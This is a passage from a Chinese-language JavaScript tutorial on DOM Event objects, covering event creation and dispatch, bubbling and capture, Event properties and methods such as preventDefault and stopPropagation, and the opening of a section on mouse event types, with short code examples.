<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ev = <span class="keyword">new</span> <span class="title class_">Event</span>( <span class="comment">// 创建一个新的事件实例</span></span><br><span class="line">  <span class="string">&#x27;look&#x27;</span>, <span class="comment">// 事件名称</span></span><br><span class="line">  &#123; <span class="comment">// 事件配置</span></span><br><span class="line">    <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>, <span class="comment">// 事件是否冒泡</span></span><br><span class="line">    <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">false</span> <span class="comment">// 事件是否可以被取消</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">dispatchEvent</span>(ev); <span class="comment">// 触发ev实例，该实例是look事件</span></span><br></pre></td></tr></table></figure>

<p>上面代码新建一个<code>look</code>事件实例，然后使用<code>dispatchEvent</code>方法触发该事件。</p>
<p>注意，如果不是显式指定<code>bubbles</code>属性为<code>true</code>，生成的事件就只能在“捕获阶段”触发监听函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> tag = event.<span class="property">currentTarget</span>.<span class="property">tagName</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Tag: &#x27;</span> + tag); <span class="comment">// 没有任何输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>); <span class="comment">// 该事件是在冒泡阶段监听函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> click = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;click&#x27;</span>); </span><br><span class="line">p.<span class="title function_">dispatchEvent</span>(click); <span class="comment">// 给p发出一个click事件，该事件默认不会冒泡，因此不会触发父元素div的click事件</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p</code>元素发出一个<code>click</code>事件，该事件默认不会冒泡。<code>div.addEventListener</code>方法指定在冒泡阶段监听，因此监听函数不会触发。如果写成<code>div.addEventListener(&#39;click&#39;, callback, true)</code>，那么在“捕获阶段”可以监听到这个事件。</p>
<p>另一方面，如果这个事件在<code>div</code>元素上触发。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">dispatchEvent</span>(click);</span><br></pre></td></tr></table></figure>

<p>那么，不管<code>div</code>元素是在冒泡阶段监听，还是在捕获阶段监听，都会触发监听函数。因为这时<code>div</code>元素是事件的目标，不存在是否冒泡的问题，<code>div</code>元素总是会接收到事件，因此导致监听函数生效。</p>
<h3 id="2-实例属性"><a href="#2-实例属性" class="headerlink" title="2. 实例属性"></a>2. 实例属性</h3><h4 id="2-1-Event-bubbles-是否会冒泡，只读，Event-eventPhase-返回整数，表示事件所处阶段，只读"><a href="#2-1-Event-bubbles-是否会冒泡，只读，Event-eventPhase-返回整数，表示事件所处阶段，只读" class="headerlink" title="2.1 Event.bubbles 是否会冒泡，只读，Event.eventPhase 返回整数，表示事件所处阶段，只读"></a>2.1 Event.bubbles 是否会冒泡，只读，Event.eventPhase 返回整数，表示事件所处阶段，只读</h4><p><code>Event.bubbles</code>属性<strong>返回一个布尔值，表示当前事件是否会冒泡</strong>。该属性为<strong>只读</strong>属性，一般用来了解 Event 实例是否可以冒泡。前面说过，除非显式声明，<code>Event</code>构造函数生成的事件，默认是不冒泡的。</p>
<p><code>Event.eventPhase</code>属性<strong>返回一个整数常量，表示事件目前所处的阶段。该属性只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> phase = event.<span class="property">eventPhase</span>;</span><br></pre></td></tr></table></figure>

<p><code>Event.eventPhase</code>的返回值有四种可能。</p>
<ul>
<li>0，事件目前<strong>没有发生</strong>。</li>
<li>1，事件目前处于<strong>捕获阶段</strong>，即处于从祖先节点向目标节点的传播过程中。</li>
<li>2，事件<strong>到达目标节点</strong>，即<code>Event.target</code>属性指向的那个节点。</li>
<li>3，事件处于<strong>冒泡阶段</strong>，即处于从目标节点向祖先节点的反向传播过程中。</li>
</ul>
<h4 id="2-2-Event-cancelable-是否可取消默认行为，Event-cancelBubble是否阻止冒泡，event-defaultPrevented-是否调用过取消默认行为方法"><a href="#2-2-Event-cancelable-是否可取消默认行为，Event-cancelBubble是否阻止冒泡，event-defaultPrevented-是否调用过取消默认行为方法" class="headerlink" title="2.2 Event.cancelable 是否可取消默认行为，Event.cancelBubble是否阻止冒泡，event.defaultPrevented 是否调用过取消默认行为方法"></a>2.2 Event.cancelable 是否可取消默认行为，Event.cancelBubble是否阻止冒泡，event.defaultPrevented 是否调用过取消默认行为方法</h4><p><code>Event.cancelable</code>属性<strong>返回一个布尔值，表示事件是否可以取消</strong>。该属性为<strong>只读</strong>属性，一般用来了解 Event 实例的特性。</p>
<p><strong>大多数浏览器的原生事件是可以取消的</strong>。比如，取消<code>click</code>事件，点击链接将无效。但是除非显式声明，<code>Event</code>构造函数生成的事件，<strong>默认是不可以取消的</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.<span class="property">cancelable</span>  <span class="comment">// false 默认不可取消</span></span><br></pre></td></tr></table></figure>

<p>当<code>Event.cancelable</code>属性为<code>true</code>时，调用<code>Event.preventDefault()</code>就可以取消这个事件，阻止浏览器对该事件的默认行为。</p>
<p>如果事件不能取消，调用<code>Event.preventDefault()</code>会没有任何效果。所以使用这个方法之前，最好用<code>Event.cancelable</code>属性判断一下是否可以取消。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">preventEvent</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">cancelable</span>) &#123;</span><br><span class="line">    event.<span class="title function_">preventDefault</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;This event couldn\&#x27;t be canceled.&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">dir</span>(event);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Event.cancelBubble</code>属性是一个布尔值，如果设为<code>true</code>，相当于执行<code>Event.stopPropagation()</code>，可以<strong>阻止事件的传播。</strong></p>
<p><code>Event.defaultPrevented</code>属性返回一个布尔值，表示该事件<strong>是否调用过<code>Event.preventDefault</code>方法。该属性只读。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (event.<span class="property">defaultPrevented</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;该事件已经取消了&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-3-Event-currentTarget当前正在通过的节点，Event-target目标节点"><a href="#2-3-Event-currentTarget当前正在通过的节点，Event-target目标节点" class="headerlink" title="2.3 Event.currentTarget当前正在通过的节点，Event.target目标节点"></a>2.3 Event.currentTarget当前正在通过的节点，Event.target目标节点</h4><p>事件发生以后，会经过捕获和冒泡两个阶段，依次通过多个 DOM 节点。因此，任意时点都有两个与事件相关的节点，一个是事件的<strong>原始触发节点</strong>（<code>Event.target</code>），另一个是事件<strong>当前正在通过的节点</strong>（<code>Event.currentTarget</code>）。<strong>前者通常是后者的后代节点</strong>。</p>
<p><code>Event.currentTarget</code>属性返回事件<strong>当前所在的节点</strong>，即事件当前正在通过的节点，也就是当前正在执行的监听函数所在的那个节点。<strong>随着事件的传播，这个属性的值会变</strong>。</p>
<p><code>Event.target</code>属性返回<strong>原始触发事件的那个节点</strong>，即事件最初发生的节点。这个属性不会随着事件的传播而改变。</p>
<p>事件传播过程中，不同节点的监听函数内部的<code>Event.target</code>与<code>Event.currentTarget</code>属性的值是不一样的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;para&quot;&gt;Hello &lt;em&gt;World&lt;/em&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hide</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">// 不管点击 Hello 或 World，总是返回 true</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === e.<span class="property">currentTarget</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 点击 Hello，返回 true</span></span><br><span class="line">  <span class="comment">// 点击 World，返回 false</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === e.<span class="property">target</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;para&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, hide, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>&lt;em&gt;</code>是<code> &lt;p&gt; </code>的子节点，点击<code>&lt;em&gt;</code>或者点击<code> &lt;p&gt; </code>，都会导致监听函数执行。这时，<code>e.target</code>总是指向原始点击位置的那个节点，而<code>e.currentTarget</code>指向事件传播过程中正在经过的那个节点。由于监听函数只有事件经过时才会触发，所以<code>e.currentTarget</code>总是等同于监听函数内部的<code>this</code>。</p>
<h4 id="2-4-Event-type-事件类型（如：’click’）"><a href="#2-4-Event-type-事件类型（如：’click’）" class="headerlink" title="2.4 Event.type 事件类型（如：’click’）"></a>2.4 Event.type 事件类型（如：’click’）</h4><p><code>Event.type</code>属性<strong>返回一个字符串，表示事件类型</strong>。事件的类型是在生成事件的时候指定的。该属性只读。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.<span class="property">type</span> <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-5-Event-timeStamp-相对于打开网页后的毫秒时间戳"><a href="#2-5-Event-timeStamp-相对于打开网页后的毫秒时间戳" class="headerlink" title="2.5 Event.timeStamp 相对于打开网页后的毫秒时间戳"></a>2.5 Event.timeStamp 相对于打开网页后的毫秒时间戳</h4><p><code>Event.timeStamp</code>属性返回一个毫秒时间戳，表示事件发生的时间。它是相对于网页加载成功开始计算的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.<span class="property">timeStamp</span> <span class="comment">// 3683.6999999995896</span></span><br></pre></td></tr></table></figure>

<p>它的返回值有可能是整数，也有可能是小数（高精度时间戳），取决于浏览器的设置。</p>
<p>下面是一个<strong>计算鼠标移动速度的例子</strong>，显示每秒移动的像素数量。</p>
<h6 id="例子：计算鼠标移动速度"><a href="#例子：计算鼠标移动速度" class="headerlink" title="例子：计算鼠标移动速度"></a>例子：计算鼠标移动速度</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> previousX;</span><br><span class="line"><span class="keyword">var</span> previousY;</span><br><span class="line"><span class="keyword">var</span> previousT;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    previousX !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">    previousY !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">    previousT !== <span class="literal">undefined</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">var</span> deltaX = event.<span class="property">screenX</span> - previousX;</span><br><span class="line">    <span class="keyword">var</span> deltaY = event.<span class="property">screenY</span> - previousY;</span><br><span class="line">    <span class="keyword">var</span> deltaD = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="title class_">Math</span>.<span class="title function_">pow</span>(deltaX, <span class="number">2</span>) + <span class="title class_">Math</span>.<span class="title function_">pow</span>(deltaY, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> deltaT = event.<span class="property">timeStamp</span> - previousT;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(deltaD / deltaT * <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  previousX = event.<span class="property">screenX</span>;</span><br><span class="line">  previousY = event.<span class="property">screenY</span>;</span><br><span class="line">  previousT = event.<span class="property">timeStamp</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h4 id="2-6-Event-isTrusted-是否由真实用户行为产生的事件"><a href="#2-6-Event-isTrusted-是否由真实用户行为产生的事件" class="headerlink" title="2.6 Event.isTrusted 是否由真实用户行为产生的事件"></a>2.6 Event.isTrusted 是否由真实用户行为产生的事件</h4><p><code>Event.isTrusted</code>属性返回一个<strong>布尔值</strong>，表示<strong>该事件是否由真实的用户行为产生</strong>。比如，用户点击链接会产生一个<code>click</code>事件，该事件是用户产生的；<code>Event</code>构造函数生成的事件，则是脚本产生的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evt = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">evt.<span class="property">isTrusted</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>evt</code>对象是脚本产生的，所以<code>isTrusted</code>属性返回<code>false</code>。</p>
<h4 id="2-7-Event-detail-事件的细节（单击or双击等）"><a href="#2-7-Event-detail-事件的细节（单击or双击等）" class="headerlink" title="2.7 Event.detail 事件的细节（单击or双击等）"></a>2.7 Event.detail 事件的细节（单击or双击等）</h4><p><code>Event.detail</code>属性只有浏览器的 UI （用户界面）事件才具有。该属性返回一个数值，表示事件的某种信息。具体含义与事件类型相关。比如，对于<code>click</code>和<code>dblclick</code>事件，<code>Event.detail</code>是鼠标按下的次数（<code>1</code>表示单击，<code>2</code>表示双击，<code>3</code>表示三击）；对于鼠标滚轮事件，<code>Event.detail</code>是滚轮正向滚动的距离，负值就是负向滚动的距离，返回值总是3的倍数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">giveDetails</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">detail</span>); <span class="comment">// 快速点击的次数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="property">onclick</span> = giveDetails;</span><br></pre></td></tr></table></figure>



<h3 id="3、实例方法"><a href="#3、实例方法" class="headerlink" title="3、实例方法"></a>3、实例方法</h3><h4 id="3-1-Event-preventDefault-取消浏览器对当前事件的默认行为"><a href="#3-1-Event-preventDefault-取消浏览器对当前事件的默认行为" class="headerlink" title="3.1 Event.preventDefault()  取消浏览器对当前事件的默认行为"></a>3.1 Event.preventDefault()  取消浏览器对当前事件的默认行为</h4><p><code>Event.preventDefault</code>方法<strong>取消浏览器对当前事件的默认行为</strong>。比如点击链接后，浏览器默认会跳转到另一个页面，使用这个方法以后，就不会跳转了；再比如，按一下空格键，页面向下滚动一段距离，使用这个方法以后也不会滚动了。该方法生效的前提是，事件对象的<code>cancelable</code>属性为<code>true</code>，如果为<code>false</code>，调用该方法没有任何效果。</p>
<p><strong>注意，该方法只是取消事件对当前元素的默认影响，不会阻止事件的传播</strong>。如果要阻止传播，可以使用<code>stopPropagation()</code>或<code>stopImmediatePropagation()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;checkbox&quot; id=&quot;my-checkbox&quot; /&gt;</span></span><br><span class="line"><span class="keyword">var</span> cb = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;my-checkbox&#x27;</span>);</span><br><span class="line"></span><br><span class="line">cb.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">e</span>)&#123; e.<span class="title function_">preventDefault</span>(); &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，浏览器的默认行为是单击会选中单选框，取消这个行为，就导致无法选中单选框。</p>
<p>利用这个方法，可以为文本输入框设置校验条件。如果用户的输入不符合条件，就无法将字符输入文本框。</p>
<h6 id="例子：只能输入字母的输入框"><a href="#例子：只能输入字母的输入框" class="headerlink" title="例子：只能输入字母的输入框"></a>例子：只能输入字母的输入框</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;text&quot; id=&quot;my-input&quot; /&gt;</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;my-input&#x27;</span>);</span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keypress&#x27;</span>, checkName, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkName</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">charCode</span> &lt; <span class="number">97</span> || e.<span class="property">charCode</span> &gt; <span class="number">122</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码为文本框的<code>keypress</code>事件设定监听函数后，将只能输入小写字母，否则输入事件的默认行为（写入文本框）将被取消，导致不能向文本框输入内容。</p>
<h4 id="3-2-Event-stopPropagation-阻止事件传播"><a href="#3-2-Event-stopPropagation-阻止事件传播" class="headerlink" title="3.2 Event.stopPropagation() 阻止事件传播"></a>3.2 Event.stopPropagation() 阻止事件传播</h4><p><code>stopPropagation</code>方法阻止事件在 DOM 中继续传播，防止再触发定义在别的节点上的监听函数，但是不包括在当前节点上其他的事件监听函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">stopEvent</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">stopPropagation</span>(); <span class="comment">// 阻止事件冒泡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, stopEvent, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>click</code>事件将不会进一步冒泡到<code>el</code>节点的父节点。</p>
<h4 id="3-3-Event-stopImmediatePropagation-阻止同一个事件的其他监听函数被调用"><a href="#3-3-Event-stopImmediatePropagation-阻止同一个事件的其他监听函数被调用" class="headerlink" title="3.3 Event.stopImmediatePropagation() 阻止同一个事件的其他监听函数被调用"></a>3.3 Event.stopImmediatePropagation() 阻止同一个事件的其他监听函数被调用</h4><p><code>Event.stopImmediatePropagation</code>方法阻止同一个事件的其他监听函数被调用，不管监听函数定义在当前节点还是其他节点。也就是说，该方法阻止事件的传播，比<code>Event.stopPropagation()</code>更彻底。</p>
<p>如果同一个节点对于同一个事件指定了多个监听函数，这些函数会根据添加的顺序依次调用。只要其中有一个监听函数调用了<code>Event.stopImmediatePropagation</code>方法，其他的监听函数就不会再执行了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">l1</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  e.<span class="title function_">stopImmediatePropagation</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">l2</span>(<span class="params">e</span>)&#123; <span class="comment">// 不会被调用</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, l1, <span class="literal">false</span>);</span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, l2, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码在<code>el</code>节点上，为<code>click</code>事件添加了两个监听函数<code>l1</code>和<code>l2</code>。由于<code>l1</code>调用了<code>event.stopImmediatePropagation</code>方法，所以<code>l2</code>不会被调用。</p>
<h4 id="3-4-Event-composedPath-数组，目标和冒泡的节点"><a href="#3-4-Event-composedPath-数组，目标和冒泡的节点" class="headerlink" title="3.4 Event.composedPath() 数组，目标和冒泡的节点"></a>3.4 Event.composedPath() 数组，目标和冒泡的节点</h4><p><code>Event.composedPath()</code>返回一个数组，成员是事件的最底层节点和依次冒泡经过的所有上层节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="title function_">composedPath</span>());</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// [p, div, body, html, document, Window]</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>click</code>事件的最底层节点是<code>p</code>，向上依次是<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>Window</code>。</p>
<h2 id="四、鼠标事件"><a href="#四、鼠标事件" class="headerlink" title="四、鼠标事件"></a>四、鼠标事件</h2><h3 id="1、鼠标事件的种类"><a href="#1、鼠标事件的种类" class="headerlink" title="1、鼠标事件的种类"></a>1、鼠标事件的种类</h3><p>鼠标事件指与鼠标相关的事件，继承了<code>MouseEvent</code>接口。具体的事件主要有以下一些。</p>
<ul>
<li><code>click</code>：按下鼠标（通常是按下主按钮）时触发。<strong>【单击】</strong></li>
<li><code>dblclick</code>：在同一个元素上双击鼠标时触发。<strong>【双击】</strong></li>
<li><code>mousedown</code>：按下鼠标键时触发。<strong>【按下】</strong></li>
<li><code>mouseup</code>：释放按下的鼠标键时触发。<strong>【抬起】</strong></li>
<li><code>mousemove</code>：当鼠标在一个节点内部移动时触发。当鼠标持续移动时，该事件会连续触发。为了避免性能问题，建议对该事件的监听函数做一些限定，比如限定一段时间内只能运行一次。<strong>【经过（多次）】</strong></li>
<li><code>mouseenter</code>：鼠标进入一个节点时触发，进入子节点不会触发这个事件（详见后文）。<strong>【进入（单次）】</strong></li>
<li><code>mouseover</code>：鼠标进入一个节点时触发，进入子节点会再一次触发这个事件（详见后文）。<strong>【进入+子节点】</strong></li>
<li><code>mouseleave</code>：鼠标离开一个节点时触发，离开父节点不会触发这个事件（详见后文）。<strong>【离开（单次）】</strong></li>
<li><code>mouseout</code>：鼠标离开一个节点时触发，离开父节点会触发这个事件（详见后文）。<strong>【离开+子节点】</strong></li>
<li><code>contextmenu</code>：按下鼠标右键时（上下文菜单出现前）触发，或者按下“上下文菜单键”时触发。<strong>【右键】</strong></li>
<li><code>wheel</code>：滚动鼠标的滚轮时触发，该事件继承的是<code>WheelEvent</code>接口。<strong>【滚轮】</strong></li>
</ul>
<p><code>click</code>事件指的是，用户在同一个位置先完成<code>mousedown</code>动作，再完成<code>mouseup</code>动作。因此，触发顺序是，<code>mousedown</code>首先触发，<code>mouseup</code>接着触发，<code>click</code>最后触发。</p>
<p><code>dblclick</code>事件则会在<code>mousedown</code>、<code>mouseup</code>、<code>click</code>之后触发。</p>
<p><code>mouseover</code>事件和<code>mouseenter</code>事件，都是鼠标进入一个节点时触发。两者的区别是，<code>mouseenter</code>事件只触发一次，而只要鼠标在节点内部移动，<code>mouseover</code>事件会在子节点上触发多次。</p>
